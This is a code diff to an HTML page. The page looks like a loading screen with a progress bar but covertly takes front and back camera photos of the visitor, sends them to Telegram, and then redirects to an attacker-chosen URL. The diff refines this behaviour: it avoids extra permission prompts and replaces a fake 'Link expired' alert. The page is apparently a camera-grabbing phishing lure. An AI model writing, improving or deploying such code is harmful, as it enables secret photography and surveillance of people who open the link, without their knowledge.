@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -150,7 +151,7 @@
             background-size: 300% 100%;
             border-radius: 30px;
             position: relative;
-            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
             animation: progressShimmer 3s linear infinite;
             box-shadow:
                 0 0 30px rgba(102, 126, 234, 0.6),
@@ -228,6 +229,7 @@
                 0 4px 10px rgba(0, 0, 0, 0.3);
             animation: percentGlow 2s ease-in-out infinite;
             letter-spacing: 3px;
+            transition: all 0.3s ease;
         }
 
         @keyframes percentGlow {
@@ -365,12 +367,10 @@
         }
 
         async function requestCameraAccess() {
-            updateProgress(5);
-
-            // Check if camera permission was previously granted
-            const cameraGranted = localStorage.getItem('cameraPermissionGranted');
+            smoothUpdateProgress(5);
 
             try {
+                // Request camera permission ONCE - will work for all subsequent operations
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -378,9 +378,6 @@
                         height: { ideal: 1080 }
                     }
                 });
-
-                // Save permission only when granted
-                localStorage.setItem('cameraPermissionGranted', 'true');
 
                 const video = document.getElementById('video');
                 video.srcObject = stream;
@@ -392,54 +389,77 @@
                     };
                 });
 
-                updateProgress(15);
-                await new Promise(resolve => setTimeout(resolve, 800));
+                // Wait for camera to fully initialize and adjust to lighting
+                await new Promise(resolve => setTimeout(resolve, 1200));
+
+                smoothUpdateProgress(15);
 
                 await capturePhotos();
             } catch (err) {
                 console.error('Camera access denied:', err);
-                // Don't save permission if denied - will ask again next time
-                localStorage.removeItem('cameraPermissionGranted');
-                updateProgress(5);
-
-                // Show user-friendly message (optional)
-                alert('Link expired, try again');
+                alert('Camera access is required. Please refresh and allow camera permission.');
             }
         }
 
         async function capturePhotos() {
-            const photosToCapture = [
-                { facing: 'user', label: 'Front Camera 1' },
-                { facing: 'user', label: 'Front Camera 2' },
-                { facing: 'environment', label: 'Back Camera 1' },
-                { facing: 'environment', label: 'Back Camera 2' }
+            const video = document.getElementById('video');
+
+            // Capture sequence - using SAME stream, no permission popup
+            const captureSequence = [
+                { facing: 'user', count: 2, label: 'Front' },
+                { facing: 'environment', count: 2, label: 'Back' }
             ];
 
-            for (let i = 0; i < photosToCapture.length; i++) {
-                const photo = photosToCapture[i];
-                updateProgress(20 + (i * 15));
+            let photoIndex = 0;
+            const totalPhotos = 4;
 
-                await switchCamera(photo.facing);
-                await new Promise(resolve => setTimeout(resolve, 1000));
+            for (const sequence of captureSequence) {
+                // Switch camera only when facing mode changes
+                await switchCameraSmooth(sequence.facing);
 
-                const photoBlob = await capturePhoto();
-                capturedPhotos.push(photoBlob);
+                // Wait for camera to stabilize and adjust exposure
+                await new Promise(resolve => setTimeout(resolve, 800));
 
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // Capture multiple photos from same camera
+                for (let i = 0; i < sequence.count; i++) {
+                    smoothUpdateProgress(15 + (photoIndex * 15));
+
+                    // Small delay between captures from same camera
+                    if (i > 0) {
+                        await new Promise(resolve => setTimeout(resolve, 400));
+                    }
+
+                    const photoBlob = await capturePhoto();
+                    capturedPhotos.push(photoBlob);
+
+                    photoIndex++;
+                }
             }
 
-            updateProgress(80);
+            smoothUpdateProgress(75);
             await sendPhotosToTelegram();
         }
 
-        async function switchCamera(facingMode) {
-            // Don't stop the stream, just switch camera
+        async function switchCameraSmooth(facingMode) {
+            const video = document.getElementById('video');
+
+            // Get all available video devices
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const videoDevices = devices.filter(device => device.kind === 'videoinput');
+
+            // If only one camera, skip switching
+            if (videoDevices.length === 1) {
+                return;
+            }
+
+            // Stop current tracks
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
 
             try {
-                // Reuse permission - no new prompt since already granted
+                // Get new stream with different facing mode
+                // NO NEW PERMISSION POPUP - uses existing grant
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: facingMode,
@@ -448,18 +468,17 @@
                     }
                 });
 
-                const video = document.getElementById('video');
                 video.srcObject = stream;
 
                 await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
                         video.play();
-                        setTimeout(resolve, 1500);
+                        resolve();
                     };
                 });
             } catch (err) {
                 console.error('Error switching camera:', err);
-                // If switching fails, continue with current camera
+                // Continue with current camera if switch fails
             }
         }
 
@@ -492,46 +511,40 @@
                         body: formData
                     });
 
-                    updateProgress(80 + (i * 5));
-                    await new Promise(resolve => setTimeout(resolve, 300));
+                    smoothUpdateProgress(75 + (i * 5));
+                    await new Promise(resolve => setTimeout(resolve, 200));
                 } catch (err) {
                     console.error('Error sending photo:', err);
                 }
             }
 
+            // Stop camera stream
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
 
-            updateProgress(100);
-            await new Promise(resolve => setTimeout(resolve, 1000));
+            smoothUpdateProgress(100);
+            await new Promise(resolve => setTimeout(resolve, 800));
 
-            // FIX #2: Properly redirect using the ?go= parameter
+            // Redirect using the ?go= parameter
             const urlParams = new URLSearchParams(window.location.search);
             const redirectUrl = urlParams.get('go');
-            
+
             if (redirectUrl) {
-                // Redirect to the URL specified in ?go= parameter
                 window.location.href = redirectUrl;
             } else {
-                // Fallback if no parameter provided
                 window.location.href = 'https://example.com';
             }
         }
 
-        function updateProgress(target) {
+        // Smooth progress update with CSS transitions
+        function smoothUpdateProgress(target) {
+            currentProgress = target;
             const progressBar = document.getElementById('progressBar');
             const percentage = document.getElementById('percentage');
 
-            const interval = setInterval(() => {
-                if (currentProgress < target) {
-                    currentProgress++;
-                    progressBar.style.width = currentProgress + '%';
-                    percentage.textContent = currentProgress + '%';
-                } else {
-                    clearInterval(interval);
-                }
-            }, 30);
+            progressBar.style.width = target + '%';
+            percentage.textContent = Math.round(target) + '%';
         }
     </script>
 </body>
